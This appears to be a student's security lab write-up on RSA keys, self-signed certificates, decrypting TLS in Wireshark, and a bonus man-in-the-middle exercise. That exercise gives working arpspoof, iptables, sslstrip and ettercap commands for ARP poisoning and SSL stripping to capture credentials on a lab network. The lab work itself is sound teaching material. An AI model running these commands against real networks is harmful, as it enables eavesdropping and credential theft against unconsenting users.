# Exercise 1: RSA Encryption
## Generate private key as server-side certificate issuer:
Command to generate RSA private key (1024 bits) - certificate issuer
`openssl genrsa -out rsa_private 1024`

```
-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALzIQu1XUArt7syu
-----END PRIVATE KEY-----
```

## Request to the CA to sign a certificate for my private key
Command to generate a new certificate signing request (CSR) using RSA key:
    `openssl req -new -key rsa_private -out rsa_cert.csr`
```
-----BEGIN CERTIFICATE REQUEST-----
MIIB4TCCAUoCAQAwgYgxCzAJBgNVBAYTAkRLMRAwDgYDVQQIDAdEZW5tYXJrMQsw
-----END CERTIFICATE REQUEST-----
```

## Questions:
* We just used RSA with a key length of 1024. Can you see any potential issues already?
    - NIST recommends using RSA keys of length at least 2048 bits, otherwise  they are considered insecure as they can be brute-forced.

* We created our CSR from a private key. What would happen if we shared this key?
    - If the certificate issuer's private key is exposed, then an attacker could eavesdrop on the communication and be able to decrypt messages coming to the server (CSR creator) - therefore break confidentiality

# Exercise 2: CA certificates and self-signed certificates

## Sign a certificate - approve a CSR request - as a certificate authority (CA)
Command to sign a certificate/approve a CSR to certificate (.crt or .pem extensions):
    `openssl x509 -req -in csr_file.csr -signkey rsa_private -out certificate.pem` 

Command to inspect the certificate - `.pem` or `.crt` extension:
    `openssl x509 -text -in certificate.pem`

```
-----BEGIN CERTIFICATE-----
MIICpDCCAg0CFAFz3nYtOpHS1ec0cMkjq0bRG4xYMA0GCSqGSIb3DQEBCwUAMIGQ
-----END CERTIFICATE-----
```

The end result is a self-signed certificate for the certificate authority itself. Lacks trust in the root certificate (not signed but another CA entity)

* What would happen if we connected to a server with expired certificates?
    - The certificate has not been updated meaning that the domain is not frequently verified by a proper Certificate Authority (CA)
* Can you see any potential issue with extending the validity of the certificate?
    - By extending the validity, there are increased chances of using a vulnerable certificate that does not comply with security standards. Questionable authenticity and impersonation. Vulnerable to known vulnerabilities. Regular renewal of certificates forces refreshing cryptographic keys, reducing attack surface.
* What about connecting to a server with a certificate generated using weak cryptographic
functions?
    - The certificate key is vulnerable to cryptographic attacks that enable an attcaker to discover the private key. Subsequently, the attacker can decrypt incoming messages to server and break confidentiality by having access to the private key.
* Bonus: What issues do you see in a certificate that has been valid for the last 20 years?
    - The over-extended certificate could be indicative of problems such as outdated security measures and failed audits on the domain limiting the trust into the entity behind the certificate.

# Exercise 3: TCP Server with self-signed certificate

## Run test TCP Server on port 1443
Command to setup the server using OpenSSL and given certificate and private key:
    `openssl s_server -port 1443 -cert certificate.crt -key rsa_private`

Start server use:
    `openssl s_server -accept localhost:1443 -cert certificate.crt -www -key rsa_private`

Connect the browser to the address `https://localhost:1443`. The browser warns the user that the HTTP connection is encrypted using a self-signed certificate that is not considered trust-worthy.

# Exercise 4: Wireshark traffic inspection

Inspect traffic generated by TCP server on the loopback adapter interface `lo`. All the requests to server are intercepted - traffic traces of TLS upon TCP

* Which version of TLS are we using?
    - TLS version 1.3 - based on protocol tags, record fields in the TLS messages and the reduced number of message exchanges between client and server - no resumption
    
        `Handshake -> Extension: supported_versions = TLS 1.3 (0x0304)` (selected by server and cannot be seen in App Data packets) $\longleftrightarrow$ the other version numbers are for backwards compatibility `Version: TLS 1.2 (0x0303)` and first Client Hello `Version: TLS 1.0 (0x0301)`
        ```
        --> Client Hello + Supported Cipher Suites & Versions + Change Cipher Spec (Key)
        <-- Server Hello + Change Cipher Spec (Key Agreement, Key Share) + Server Finished + App Data
        --> Client Finished + Application Data
        ```

* Which symmetric encryption/authentication algorithm do we use during the TLS negotiation between the server and our browser?
    - Cipher Suite: `TLS_AES_128_GCM_SHA256` - Advanced Encryption Scheme(AES-128) with Galois/Counter Mode(GCM) for authentication/confidentiality and SHA-256 for integrity

* Compare the packet headers with the ones from our server. Can you read the website content from the packet?
    - Website content cannot be read because the app data is encrypted. Packet headers show TLS version 1.2 and cipher suite `TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256` - Elliptic Curve Diffie-Hellman Ephemeral (RSA + AES-128) in Galois Counter Mode and SHA256 for integrity 

        `Extension: session_ticket` contains the ticket used for TLS 1.2 resumption

        Series of exchanged messages:
        ```
        --> Client Hello
        <-- Server Hello + Change Cipher Spec + Encrypted Handshake Message + Certificate + Server Hello Done
        --> Change Cipher Spec + Generate Keys + Encrypted Handshake Message + Client Finished
        --> Application Data (HTTP GET Request)
        <-- Application Data (HTTP Response)

        ```


* Use keys generated during handshakes to decrypt TLS traffic in Wireshark!
    - Command for setting the KeyLogFile variable `export SSLKEYLOGFILE=~/.ssl-key.log`
    - After visiting a website with TLS open file to get the key `cat ~/.ssl-key.log`
    - Setup Wireshark to use the KeyLog file to decrypt TLS/SSL traffic
    - Shall be able to see decrypted SSL traffic in Wireshark bottom tabs

# Bonus Exercise 5: SSL strip attack by ARP poisoning & ETTERCAP --> Man-in-the-middle
TLS encrypts communications between client and server, specifically at the handshake. If we can capture these cryptographic keys we can decrypt the live traffic. Mounting a Man-in-the-middle SSL strip attack:

Resources:
https://www.imperva.com/learn/application-security/arp-spoofing/

1. Intercept the communications between a client and a server (google “ARP poisoning”).Simplified process using the tool ettercap (comes pre-installed in Kali). 

    Determine gateway router: `route -n`

    Schematic:

        Attacked host (client - Ubuntu MAC: EEB4)----ARP request 192.168.64.1----> broadcast MAC:FFFF
        Attacker host (mitm - Kali MAC: E25F) ----ARP reply 192.168.64.1-----> attacked host (Ubuntu MAC: EEB4)
        Client host 192.168.64.5 ----- HTTP/DNS request----> Kali as gateway mapping MAC:E25F-IP:192.168.64.1
        Kali attacker MAC:E25F ----passed request----> proper gateway 192.168.64.1 router MAC:1E57 ----> {INTERNET}
        Internet ----HTTP/DNS response----> gateway router MAC:1E57 192.168.64.1
        Router MAC:1E57 192.168.64.1 ----ARP request 192.168.64.5----> broadcast MAC:FFFF
        Attacker host (mitm - Kali MAC: E25F)----ARP reply 192.168.64.5----> gateway router MAC:1E57
        Router MAC:1E57 192.168.64.1 ----HTTP/DNS response----> attacker (Kali MAC:E25F-IP:192.168.64.5)
    
    ARP Cache Poisoning Detection on the attacked host - Ubuntu:
    command used is `arp -a`

    ![ARPDetect](PoisonedARP.png)

    * Manual ARP poisoning/spoofing attack:
    
        Tutorial: 
        * https://www.golinuxcloud.com/man-in-the-middle-attack-arp-spoofing/
        * https://systemweakness.com/attack-tutorial-ssl-strip-70a0d2d73667


        Tell target machine that we are the router(gateway):
        `arpspoof -i [interface=eth0] -t [clientIP=192.168.64.5] [gatewayIP=192.168.64.1]`

        Tell router that we are actually the target device:
        `arpspoof -i [interface=eth0] -t [gatewayIP=192.168.64.1] [clientIPgatewayIP=192.168.64.5]`

        Enable IP forwarding to make attacker act as a router and start analysis using `tcpdump`:
        ```
        sudo su
        echo 1 > /proc/sys/net/ipv4/ip_forward
        exit
        ```

    * Redirect traffic from port 80 to 8080:
        `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080`

    * SSLstrip tool for man in the middle attacks - forcing client to connect via HTTP instead of HTTPS:
        `sslstrip -l 8080`


    * Perform a scan of the local network `sudo nmap -sn <subnet=192.168.64.0/24>` or `sudo nmap -pn 192.168.64.1/24`
        
            Nmap scan report for 192.168.64.5
            Host is up (0.0010s latency).
            MAC Address: EE:B4:0D:81:1A:83 (Unknown)

            Host is up (0.0012s latency).
            Not shown: 994 closed tcp ports (reset)
            PORT     STATE SERVICE
            53/tcp   open  domain
            88/tcp   open  kerberos-sec
            445/tcp  open  microsoft-ds
            3306/tcp open  mysql
            5000/tcp open  upnp
            7000/tcp open  afs3-fileserver
            MAC Address: 1E:57:DC:03:0E:64 (Unknown)

            Nmap scan report for 192.168.64.5
            Host is up (0.00036s latency).
            Not shown: 999 closed tcp ports (reset)
            PORT   STATE SERVICE
            22/tcp open  ssh
            MAC Address: EE:B4:0D:81:1A:83 (Unknown)

            Nmap scan report for 192.168.64.6
            Host is up (0.0000030s latency).
            Not shown: 999 closed tcp ports (reset)
            PORT     STATE SERVICE
            8080/tcp open  http-proxy


    * Open wireshark with privileges `sudo wireshark`, start scanning on interface `eth0` and filter by target `ip.addr = <target=192.168.64.5>`

    * Start unified sniffing between router and target device using ARP poisoning `sudo ettercap -T -S -i eth0 -M arp:remote /<router=192.168.64.1>// /<target=192.168.64.5>//`

    * Perform manual ARP spoofing (cache poisoning): 

    * Filter out unencrypted traffic such as HTTP and DNS - analyze what resources were accessed by target host and host details (OS and others)

    * Use `apackets.com` to analyze the snapshot from Wireshark `|==>` intuitive presentations

![SniffedSnippet](InterceptHTTP.png)
![ARP Poisoning](<ARP Poison Scheme.jpg>)

2. Force the client to re-establish the communication channel, but this time, bridge the connection through your server. You will force the client to establish an insecure connection with your bridge, and your bridge will create a secure connection with the server. Now you can eavesdrop on the plaintext communication!

SSLstrip attack repository: https://github.com/moxie0/sslstrip - reproduce vulnerability environment

When the SSLstrip attack is ongoing the client machine cannot connect to servers via HTTPS forced to rely on HTTP redirects only. Whenever the user tries to submit some information to the server i.e authentication credentials, the packets get redirected through the MITM attacker host via HTTP and relayed to the server via HTTPS. However, the MITM can record the decrypted information and expose user credentials this way.